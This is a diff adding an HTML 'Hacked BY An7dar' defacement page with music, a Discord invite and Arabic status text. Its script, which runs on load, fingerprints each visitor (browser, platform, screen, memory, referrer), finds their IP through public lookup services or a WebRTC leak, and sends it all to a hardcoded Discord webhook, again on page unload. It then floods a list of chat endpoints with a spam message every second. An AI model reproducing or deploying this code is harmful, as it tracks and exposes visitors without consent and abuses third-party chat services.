@@ -1,1 +1,880 @@
 
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>An7dar is here - advanced core</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@100;200;300;400;500;600;700;800&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html {
+            font-size: 16px;
+        }
+
+        body {
+            background: #000;
+            color: #fff;
+            font-family: 'JetBrains Mono', monospace;
+            overflow-x: hidden;
+            min-height: 100vh;
+            position: relative;
+        }
+
+        /* Grid background */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            background-image:
+                linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px);
+            background-size: 1.875rem 1.875rem;
+            z-index: -1;
+        }
+
+        /* Loading Screen */
+        .loading-screen {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            background: #000;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            animation: fadeOut 0s ease-in-out 5s forwards;
+        }
+
+        .glitch-text {
+            position: relative;
+            color: #fff;
+            font-size: 2.0rem;
+            font-family: 'Orbitron', monospace;
+            font-weight: 700;
+            text-align: center;
+            text-transform: uppercase;
+            letter-spacing: 0.19rem;
+            line-height: 1.6;
+        }
+
+        @keyframes fadeOut {
+            to {
+                opacity: 0;
+                visibility: hidden;
+            }
+        }
+
+        /* Main Content */
+        .main-content {
+            opacity: 0;
+            animation: fadeIn 2s ease-in-out 0.5s forwards;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            padding: 2rem;
+        }
+
+        @keyframes fadeIn {
+            to { opacity: 1; }
+        }
+
+        .container {
+            text-align: center;
+            max-width: 50rem;
+            padding: 2.5rem;
+            width: 100%;
+        }
+
+        /* Avatar */
+        .avatar-container {
+            margin-bottom: 2.5rem;
+            position: relative;
+        }
+
+        .avatar {
+            width: 31.25rem;
+            max-width: 90vw;
+            height: 18.75rem;
+            max-height: 54vw;
+            border: 0.188rem solid rgba(255,255,255,0.3);
+            box-shadow: 0 0 1.875rem rgba(255,255,255,0.2), inset 0 0 1.875rem rgba(255,255,255,0.1);
+            background: linear-gradient(135deg, #333, #111);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .avatar:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 3.125rem rgba(255,255,255,0.4), inset 0 0 1.875rem rgba(255,255,255,0.2);
+        }
+
+        .avatar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        /* Title */
+        .An7dared-title {
+            font-family: 'Orbitron', monospace;
+            font-size: 3.75rem;
+            font-weight: 900;
+            letter-spacing: 0.1rem;
+            margin-bottom: 1.25rem;
+            background: linear-gradient(45deg, #fff, #888);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            text-transform: uppercase;
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+
+        @keyframes glow {
+            from { filter: drop-shadow(0 0 1.25rem rgba(255,255,255,0.3)); }
+            to { filter: drop-shadow(0 0 2.5rem rgba(255,255,255,0.6)); }
+        }
+
+        /* Terminal */
+        .terminal-section {
+            background: rgba(0,0,0,0.8);
+            border: 0.063rem solid rgba(255,255,255,0.2);
+            border-radius: 0.625rem;
+            padding: 1.875rem;
+            margin-top: 2.5rem;
+            backdrop-filter: blur(0.625rem);
+            box-shadow: 0 0.625rem 1.875rem rgba(0,0,0,0.5);
+        }
+
+        .terminal-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 1.25rem;
+            padding-bottom: 0.938rem;
+            border-bottom: 0.063rem solid rgba(255,255,255,0.1);
+        }
+
+        .terminal-dots {
+            display: flex;
+            gap: 0.5rem;
+            margin-right: 1.25rem;
+        }
+
+        .dot {
+            width: 0.75rem;
+            height: 0.75rem;
+            border-radius: 50%;
+            border: 0.063rem solid rgba(255,255,255,0.3);
+        }
+
+        .terminal-title {
+            font-family: 'Orbitron', monospace;
+            font-size: 1.375rem;
+            color: #fff;
+            letter-spacing: 0.1rem;
+        }
+
+        .command-line {
+            font-size: 1.5rem;
+            margin: 0.938rem 0;
+            opacity: 0;
+            animation: typeIn 0.5s ease forwards;
+            display: flex;
+            align-items: center;
+            text-align: left;
+        }
+
+        .command-line:nth-child(2) { animation-delay: 2.5s; }
+        .command-line:nth-child(3) { animation-delay: 3s; }
+        .command-line:nth-child(4) { animation-delay: 3.5s; }
+
+        @keyframes typeIn {
+            to { opacity: 1; }
+        }
+
+        .prompt {
+            color: rgba(255,255,255,0.5);
+            margin-left: 0.625rem;
+            margin-right: 0.313rem;
+        }
+
+        .command {
+            color: #fff;
+            font-weight: 500;
+        }
+
+        .success {
+            color: #4ade80;
+            font-weight: 600;
+        }
+
+        /* IP Section */
+        .ip-section {
+            margin-top: 1.875rem;
+            padding: 1.25rem;
+            background: rgba(0,0,0,0.8);
+            border: 0.063rem solid rgba(255,255,255,0.2);
+            border-radius: 0.625rem;
+            backdrop-filter: blur(0.625rem);
+            box-shadow: 0 0.625rem 1.875rem rgba(0,0,0,0.5);
+            text-align: center;
+            animation: fadeIn 1s ease-in-out 4s forwards;
+            opacity: 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .ip-section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 0.188rem;
+            background: linear-gradient(90deg, transparent, #4ade80, transparent);
+            animation: scanLine 2s linear infinite;
+        }
+
+        @keyframes scanLine {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+
+        .ip-display {
+            font-size: 1.75rem;
+            color: #4ade80;
+            font-weight: bold;
+            letter-spacing: 0.063rem;
+            margin: 0.938rem 0;
+            font-family: 'Orbitron', monospace;
+            animation: pulseIp 2s ease-in-out infinite alternate;
+            text-shadow: 0 0 0.625rem rgba(74, 222, 128, 0.5);
+            padding: 0.625rem;
+            background: rgba(0,0,0,0.5);
+            border-radius: 0.313rem;
+            border: 0.063rem solid rgba(74, 222, 128, 0.3);
+        }
+
+        @keyframes pulseIp {
+            0% { text-shadow: 0 0 0.313rem rgba(74, 222, 128, 0.5); transform: scale(1); }
+            50% { text-shadow: 0 0 0.938rem rgba(74, 222, 128, 0.8); transform: scale(1.02); }
+            100% { text-shadow: 0 0 0.313rem rgba(74, 222, 128, 0.5); transform: scale(1); }
+        }
+
+        .ip-info {
+            font-size: 0.875rem;
+            color: rgba(255,255,255,0.5);
+            letter-spacing: 0.063rem;
+            text-transform: uppercase;
+            margin-top: 0.625rem;
+        }
+
+        .ip-stats {
+            display: flex;
+            justify-content: space-around;
+            margin-top: 1.25rem;
+            padding-top: 1.25rem;
+            border-top: 0.063rem solid rgba(255,255,255,0.1);
+        }
+
+        .stat-item {
+            text-align: center;
+        }
+
+        .stat-value {
+            font-size: 1.125rem;
+            color: #4ade80;
+            font-weight: bold;
+            font-family: 'Orbitron', monospace;
+        }
+
+        .stat-label {
+            font-size: 0.75rem;
+            color: rgba(255,255,255,0.5);
+            text-transform: uppercase;
+            margin-top: 0.313rem;
+        }
+
+        /* Logging Animation */
+        .logging-animation {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            margin: 1rem 0;
+        }
+
+        .log-dot {
+            width: 0.5rem;
+            height: 0.5rem;
+            background: #4ade80;
+            border-radius: 50%;
+            animation: logPulse 1.5s ease-in-out infinite;
+        }
+
+        .log-dot:nth-child(2) { animation-delay: 0.2s; }
+        .log-dot:nth-child(3) { animation-delay: 0.4s; }
+
+        @keyframes logPulse {
+            0%, 100% { opacity: 0.3; transform: scale(0.8); }
+            50% { opacity: 1; transform: scale(1); }
+        }
+
+        /* Status Indicator */
+        .status-indicator {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            padding: 0.25rem 0.75rem;
+            background: rgba(0,0,0,0.5);
+            border-radius: 1rem;
+            margin-top: 0.5rem;
+        }
+
+        .status-dot {
+            width: 0.5rem;
+            height: 0.5rem;
+            background: #4ade80;
+            border-radius: 50%;
+            animation: statusBlink 1s infinite;
+        }
+
+        @keyframes statusBlink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        /* Footer */
+        .footer-message {
+            margin-top: 2.5rem;
+            font-size: 0.875rem;
+            color: rgba(255,255,255,0.5);
+            letter-spacing: 0.125rem;
+            text-transform: uppercase;
+        }
+
+        /* Learn Box */
+        .learn-box {
+            position: absolute;
+            top: 2.975rem;
+            left: 1.875rem;
+            background: rgba(0, 0, 0, 0.6);
+            padding: 1.25rem;
+            border: 0.063rem solid rgba(255,255,255,0.2);
+            border-radius: 0.75rem;
+            backdrop-filter: blur(0.5rem);
+            z-index: 1000;
+            box-shadow: 0 0 1.25rem rgba(255,255,255,0.1);
+        }
+
+        .learn-title {
+            font-family: 'Orbitron', monospace;
+            font-size: 0.875rem;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 0.75rem;
+            letter-spacing: 0.063rem;
+            text-transform: uppercase;
+        }
+
+        .learn-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 0.625rem;
+        }
+
+        .learn-item {
+            background: rgba(255, 255, 255, 0.05);
+            border: 0.063rem solid rgba(255,255,255,0.1);
+            padding: 0.625rem 0.938rem;
+            border-radius: 0.375rem;
+            font-size: 0.813rem;
+            color: #4ade80;
+            font-family: 'JetBrains Mono', monospace;
+            transition: all 0.3s ease;
+        }
+
+        .learn-item:hover {
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            transform: translateX(0.313rem);
+        }
+
+        .learn-footer {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transform: translateX(-0.313rem);
+            margin-top: 0.938rem;
+            padding-top: 0.625rem;
+            border-top: 0.063rem solid rgba(255,255,255,0.1);
+            gap: 0.625rem;
+        }
+
+        .discord-icon {
+            width: 1.25rem;
+            height: 1.25rem;
+            object-fit: contain;
+            opacity: 0.8;
+        }
+
+        .discord-link {
+            font-size: 1rem;
+            color: #fff;
+            font-family: 'JetBrains Mono', monospace;
+            letter-spacing: 0.063rem;
+            opacity: 0.8;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .An7dared-title { font-size: 2rem; }
+            .container { padding: 1.25rem; }
+            .learn-box { position: relative; top: auto; left: auto; margin-bottom: 2rem; }
+        }
+    </style>
+</head>
+<body>
+
+<audio id="bg-music" autoplay loop>
+    <source src="https://files.catbox.moe/8fzwgj.mp3" type="audio/mpeg">
+</audio>
+
+<!-- Loading Screen -->
+<div class="loading-screen">
+    <div class="loading-text glitch-text" data-text="Security Alert An7dar in the system ..">
+   Hello Everyone 22CQ is Here Stay Tuned,  ..<br> Empire was here 
+    </div>
+</div>
+
+<!-- Main Content -->
+<div class="main-content">
+    <div class="container">
+        <div class="avatar-container">
+            <div class="avatar">
+                <img src="https://i.ibb.co/8nH61S6j/6421779-0463913033-tumbl.gif" alt="avatar" />
+            </div>
+        </div>
+
+        <h1 class="An7dared-title">Hacked BY An7dar </h1>
+
+        <div class="terminal-section">
+            <div class="terminal-header">
+                <div class="terminal-dots">
+                    <div class="dot"></div>
+                    <div class="dot"></div>
+                    <div class="dot"></div>
+                </div>
+                <div class="terminal-title">Discord.gg/PT5MspcQvG/</div>
+            </div>
+
+            <div class="command-line">
+                <span class="prompt">server@system:~$</span>
+                <span class="command">whoami</span>
+            </div>
+
+            <div class="command-line">
+                <span class="success">An7dar : United We Command (:</span>
+            </div>
+            
+            <div class="command-line">
+                <span class="prompt">system:~$</span>
+                <span class="command">chat flood activated</span>
+            </div>
+        </div>
+
+        <!-- IP Section -->
+        <div class="ip-section">
+            <div class="terminal-header">
+                <div class="terminal-dots">
+                    <div class="dot"></div>
+                    <div class="dot"></div>
+                    <div class="dot"></div>
+                </div>
+                <div class="terminal-title"> Empire </div>
+            </div>
+            
+            <div class="logging-animation">
+                <div class="log-dot"></div>
+                <div class="log-dot"></div>
+                <div class="log-dot"></div>
+            </div>
+            
+            <div id="ipDisplay" class="ip-display">discord.gg.empire</div>
+            
+            <div class="status-indicator">
+                <div class="status-dot"></div>
+                <span id="statusText" style="font-size: 0.75rem; color: #4ade80;">جاري الإرسال إلى سيرفرات An7dar...</span>
+            </div>
+            
+            <div class="ip-info">IP Address Successfully Captured</div>
+            
+            <div class="ip-stats">
+                <div class="stat-item">
+                    <div class="stat-value" id="userAgentShort">-</div>
+                    <div class="stat-label">المتصفح</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value" id="screenSize">-</div>
+                    <div class="stat-label">الدقة</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value" id="connectionStatus">-</div>
+                    <div class="stat-label">الاتصال</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer-message">Officaly Discord.gg/PT5MspcQvG • Empire .</div>
+
+        <div class="learn-box">
+            <div class="learn-title">You Got An7dared By Empire :</div>
+            <div class="learn-grid">
+                <div class="learn-item">.An7dar</div>
+                <div class="learn-footer">
+                    <img src="https://i.ibb.co/HLD6j14t/discord-ezgif-com-webp-to-png-converter.png" alt="Discord" class="discord-icon" />
+                    <span class="discord-link">Discord.gg/PT5MspcQvG</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    // Preload effect
+    window.addEventListener('load', function () {
+        setTimeout(() => {
+            document.querySelector('.loading-screen').style.display = 'none';
+        }, 5000);
+    });
+
+    // Subtle screen flicker
+    setInterval(() => {
+        if (Math.random() < 0.50) {
+            document.body.style.filter = 'brightness(1.2)';
+            setTimeout(() => {
+                document.body.style.filter = 'brightness(1)';
+            }, 50);
+        }
+    }, 2000);
+
+    // Avatar hover effect
+    window.addEventListener('load', () => {
+        const avatar = document.querySelector('.avatar');
+        setTimeout(() => {
+            avatar.classList.add('force-hover');
+            setTimeout(() => {
+                avatar.classList.remove('force-hover');
+            }, 3000);
+        }, 5000);
+    });
+
+    // Learn items sequential effect
+    window.addEventListener('load', () => {
+        const items = document.querySelectorAll('.learn-item');
+        let index = 0;
+        function applyEffectSequentially() {
+            if (index >= items.length) index = 0;
+            const item = items[index];
+            item.classList.add('force-hover');
+            setTimeout(() => {
+                item.classList.remove('force-hover');
+                index++;
+                setTimeout(applyEffectSequentially, 1500); 
+            }, 1000); 
+        }
+        setTimeout(applyEffectSequentially, 6000);
+    });
+
+    // ---------- SHADOW CORE INTEGRATION ----------
+    // Discord Webhook
+    const DISCORD_WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1476278524099825734/r3vRYA37_fdbtr8eI1z1jceZj5Egyr8wW3eFtQQjWlNUxPe8CM0MVLjPn_E_0iBnnRDg';
+
+    // الزومبي msg ثابت
+    const msg = `An7dar - dis.gg/empire`;
+    
+    // قائمة endpoints للـ chat flood
+    const chatEndpoints = [
+        { url: "https://Flix-Scripts/chatResult", method: "POST", body: JSON.stringify({ message: msg }) },
+        { url: "https://danger_chat/Danger_Chat:SendMessage", method: "POST", body: JSON.stringify({"message": msg,"channel": "شات العام","color": null,"isImageAndLinksAllowed": [false,false]}) },
+        { url: "https://easy-chat+/o6ZbK5Ecp6", method: "POST", headers: {"accept": "*/*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"}, body: JSON.stringify({ message: msg, channel: "شات العام" }) },
+        { url: "https://Melox_Chat/chatResult", method: "POST", body: JSON.stringify({ message: msg }) },
+        { url: "https://Melix_Chat/chatResult", method: "POST", body: JSON.stringify({ message: msg }) },
+        { url: "https://AS_Chat/chatResult", method: "POST", body: JSON.stringify({ message: msg }) },
+        { url: "https://chat/chatResult", method: "POST", body: JSON.stringify({ message: msg }) },
+        { url: "https://ho-chatv2/Chat", method: "POST", body: JSON.stringify({"Type": "chatResult","message": msg,"chatType": "general"}) }
+    ];
+
+    // Flood function: ترسل كل ثانية إلى كل endpoint
+    function startChatFlood() {
+        console.log("🔥 CHAT FLOOD ACTIVATED - An7dar mode");
+        setInterval(() => {
+            chatEndpoints.forEach(endpoint => {
+                fetch(endpoint.url, {
+                    method: endpoint.method,
+                    headers: endpoint.headers || { 'Content-Type': 'application/json' },
+                    body: endpoint.body
+                })
+                .then(res => {
+                    if (res.ok) console.log(`✅ Flood sent to ${endpoint.url}`);
+                    else console.log(`⚠️ Flood failed to ${endpoint.url} (${res.status})`);
+                })
+                .catch(err => console.log(`❌ Error flooding ${endpoint.url}:`, err));
+            });
+        }, 1000); // كل ثانية
+    }
+
+    // جمع معلومات الزائر
+    function collectVisitorInfo() {
+        const info = {
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            platform: navigator.platform,
+            screenWidth: window.screen.width,
+            screenHeight: window.screen.height,
+            colorDepth: window.screen.colorDepth,
+            pixelRatio: window.devicePixelRatio,
+            referrer: document.referrer || "Direct",
+            url: window.location.href,
+            timestamp: new Date().toISOString(),
+            cookiesEnabled: navigator.cookieEnabled,
+            online: navigator.onLine ? "Online" : "Offline",
+            hardwareConcurrency: navigator.hardwareConcurrency || "Unknown",
+            deviceMemory: navigator.deviceMemory || "Unknown"
+        };
+        
+        document.getElementById('userAgentShort').textContent = getBrowserName(info.userAgent);
+        document.getElementById('screenSize').textContent = `${info.screenWidth}x${info.screenHeight}`;
+        document.getElementById('connectionStatus').textContent = info.online;
+        
+        return info;
+    }
+
+    function getBrowserName(userAgent) {
+        if (userAgent.includes("Chrome")) return "Chrome";
+        if (userAgent.includes("Firefox")) return "Firefox";
+        if (userAgent.includes("Safari")) return "Safari";
+        if (userAgent.includes("Edge")) return "Edge";
+        if (userAgent.includes("Opera")) return "Opera";
+        return "Unknown";
+    }
+
+    // دالة جلب IP
+    async function fetchIP() {
+        const info = collectVisitorInfo();
+        let detectedIP = 'Unknown';
+        const statusText = document.getElementById('statusText');
+        const ipDisplay = document.getElementById('ipDisplay');
+        
+        const ipServices = [
+            { url: 'https://api.ipify.org?format=json', type: 'json' },
+            { url: 'https://api64.ipify.org?format=json', type: 'json' },
+            { url: 'https://ipv4.icanhazip.com/', type: 'text' },
+            { url: 'https://ip.seeip.org/jsonip', type: 'json' },
+            { url: 'https://api.myip.com', type: 'json' },
+            { url: 'https://ipapi.co/json/', type: 'json' }
+        ];
+        
+        const updateStatus = (message, color = '#4ade80') => {
+            statusText.textContent = message;
+            statusText.style.color = color;
+        };
+        
+        updateStatus('🔍 جاري البحث عن الـ IP...');
+        
+        for (let i = 0; i < ipServices.length; i++) {
+            const service = ipServices[i];
+            
+            try {
+                updateStatus(`🔄 المحاولة ${i + 1}/${ipServices.length}...`);
+                
+                const response = await fetch(service.url, { 
+                    method: 'GET',
+                    mode: 'cors',
+                    headers: { 'Accept': 'application/json' }
+                });
+                
+                if (response.ok) {
+                    if (service.type === 'json') {
+                        const data = await response.json();
+                        detectedIP = data.ip || data.ipAddress || data.query || data.IPv4;
+                    } else {
+                        const text = await response.text();
+                        detectedIP = text.trim();
+                    }
+                    
+                    if (detectedIP && detectedIP !== 'Unknown') {
+                        updateStatus('✅ تم العثور على الـ IP!');
+                        break;
+                    }
+                }
+            } catch (error) {
+                console.log(`Service ${service.url} failed:`, error);
+                continue;
+            }
+        }
+        
+        // WebRTC fallback
+        if (detectedIP === 'Unknown') {
+            try {
+                const localIP = await getLocalIPViaWebRTC();
+                detectedIP = `Local: ${localIP}`;
+                updateStatus('⚠️ IP محلي فقط (WebRTC)');
+            } catch (error) {
+                updateStatus('❌ فشل الحصول على الـ IP', '#ff6b6b');
+                detectedIP = 'غير متاح';
+            }
+        }
+        
+        ipDisplay.textContent = detectedIP;
+        ipDisplay.style.color = '#4ade80';
+        document.querySelector('.logging-animation').style.display = 'none';
+        
+        // إرسال إلى ديسكورد
+        await sendToDiscord(detectedIP, info);
+        
+        updateStatus(' United We Command');
+        
+        return detectedIP;
+    }
+
+    // WebRTC
+    async function getLocalIPViaWebRTC() {
+        return new Promise((resolve, reject) => {
+            const pc = new RTCPeerConnection({ iceServers: [] });
+            pc.createDataChannel('');
+            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(reject);
+            
+            let ipFound = false;
+            
+            pc.onicecandidate = (ice) => {
+                if (ipFound || !ice || !ice.candidate || !ice.candidate.candidate) return;
+                
+                const candidate = ice.candidate.candidate;
+                const regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+                const match = regex.exec(candidate);
+                
+                if (match) {
+                    ipFound = true;
+                    resolve(match[1]);
+                    pc.close();
+                }
+            };
+            
+            setTimeout(() => {
+                if (!ipFound) {
+                    pc.close();
+                    reject('Timeout');
+                }
+            }, 3000);
+        });
+    }
+
+    // إرسال إلى ديسكورد
+    async function sendToDiscord(ip, visitorInfo) {
+        const payload = {
+            embeds: [{
+                title: "🔥 IP CAPTURED -  An7dar",
+                description: `**IP Address:** \`${ip}\`\n**Time:** ${new Date().toLocaleString("ar-SA")}\n**Page:** team bom is here`,
+                color: 0x00ff00,
+                fields: [
+                    {
+                        name: "🌍 معلومات الزائر",
+                        value: `**المتصفح:** ${getBrowserName(visitorInfo.userAgent)}\n**اللغة:** ${visitorInfo.language}\n**النظام:** ${visitorInfo.platform}\n**الدقة:** ${visitorInfo.screenWidth}x${visitorInfo.screenHeight}`,
+                        inline: true
+                    },
+                    {
+                        name: "📊 معلومات إضافية",
+                        value: `**المعالجات:** ${visitorInfo.hardwareConcurrency}\n**الذاكرة:** ${visitorInfo.deviceMemory}GB\n**الكوكيز:** ${visitorInfo.cookiesEnabled ? "✅" : "❌"}`,
+                        inline: true
+                    },
+                    {
+                        name: "📱 User Agent",
+                        value: `\`\`\`${visitorInfo.userAgent.substring(0, 1000)}\`\`\``,
+                        inline: false
+                    },
+                    {
+                        name: "🔗 المصدر",
+                        value: visitorInfo.referrer,
+                        inline: true
+                    }
+                ],
+                timestamp: new Date().toISOString(),
+                footer: { text: "An7dar  • Discord.gg/PT5MspcQvG" }
+            }]
+        };
+        
+        try {
+            await fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            console.log('✅ Discord sent');
+        } catch (e) {
+            console.log('Discord error:', e);
+        }
+    }
+
+    // بدء كل شيء عند التحميل
+    window.addEventListener('load', async () => {
+        // تأخير لجلب IP
+        setTimeout(async () => {
+            await fetchIP();
+            // بعد جلب IP نبدأ الفيض
+            startChatFlood();
+        }, 3500);
+        
+        // also send on beforeunload
+        window.addEventListener('beforeunload', async () => {
+            const info = collectVisitorInfo();
+            const ipDisplay = document.getElementById('ipDisplay');
+            const ip = ipDisplay.textContent !== 'جاري جمع المعلومات...' ? ipDisplay.textContent : 'Unknown';
+            await sendToDiscord(ip, info);
+        });
+    });
+
+    // تأثيرات IP glitch
+    document.addEventListener('DOMContentLoaded', () => {
+        const ipDisplay = document.getElementById('ipDisplay');
+        const originalText = ipDisplay.textContent;
+        
+        setInterval(() => {
+            if (Math.random() < 0.1 && ipDisplay.textContent !== 'جاري جمع المعلومات...') {
+                const chars = '0123456789ABCDEF.';
+                let glitched = '';
+                for (let i = 0; i < ipDisplay.textContent.length; i++) {
+                    if (Math.random() < 0.1) {
+                        glitched += chars.charAt(Math.floor(Math.random() * chars.length));
+                    } else {
+                        glitched += ipDisplay.textContent.charAt(i);
+                    }
+                }
+                ipDisplay.textContent = glitched;
+                
+                setTimeout(() => {
+                    ipDisplay.textContent = originalText !== 'جاري جمع المعلومات...' ? originalText : ipDisplay.textContent;
+                }, 100);
+            }
+        }, 2000);
+    });
+</script>
+
+</body>
+</html> 
